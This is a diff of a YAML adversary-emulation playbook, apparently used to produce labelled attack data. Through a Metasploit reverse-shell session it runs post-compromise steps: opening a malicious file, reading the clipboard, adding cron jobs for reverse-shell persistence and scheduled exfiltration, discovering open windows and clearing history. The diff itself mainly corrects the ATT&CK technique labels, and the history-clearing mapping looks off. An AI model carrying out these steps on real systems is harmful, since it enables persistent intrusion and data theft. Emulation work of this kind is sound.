@@ -124,7 +124,9 @@ commands:
     input: "soffice /home/judy/Nutzungshinweise.odt"
     session: client
     metadata:
-      techniques: "T1204"
+      techniques: "T1204.002"
+      tactics: "Execution"
+      technique_name: "User Execution: Malicious File"
 
   - type: sleep
     seconds: 1
@@ -194,7 +196,9 @@ commands:
     session: revshell
     cmd: xclip -selection clipboard -o
     metadata:
-      techniques: "T1515"
+      techniques: "T1115"
+      tactics: "Collection"
+      technique_name: "Clipboard Data"
 
   # save the meterpreter payload in /home
   - type: msf-session
@@ -206,12 +210,14 @@ commands:
     session: revshell
     cmd: chmod +x /home/judy/.local/bin/veiltransfer_client_linux 
 
-  # add the persistence cronjob
+  # add the cronjob that persists reverse shell
   - type: msf-session
-    session: revshell 
-    cmd: crontab /home/judy/crontab.txt
+    session: revshell
+    cmd: (crontab -l; cat /home/judy/crontab.txt) | crontab -
     metadata:
-      techniques: "T1053"
+      techniques: "T1053.003"
+      tactics: "Persistence"
+      technique_name: "Scheduled Task/Job: Cron"
 
   # add the cronjob to extract data
   - type: msf-session
@@ -219,20 +225,26 @@ commands:
     cmd: (crontab -l; cat /home/judy/downloader.txt) | crontab -
     metadata:
       techniques: "T1029"
+      tactics: "Exfiltration"
+      technique_name: "Scheduled Transfer"
 
   # find out which windown are open
   - type: msf-session
     session: revshell
     cmd:  wmctrl -l
     metadata:
-      techniques: "T010"
+      techniques: "T1010"
+      tactics: "Discovery"
+      technique_name: "Application Window Discovery"
 
   # clear history
   - type: msf-session
     session: revshell
     cmd: history -c
     metadata:
-      techniques: "T1565"
+      techniques: "T1565.001"
+      tactics: "Defensive Evasion"
+      technique_name: "Data Manipulation: Stored Data Manipulation"
 
   # exit the interactive shell
   - type: msf-session
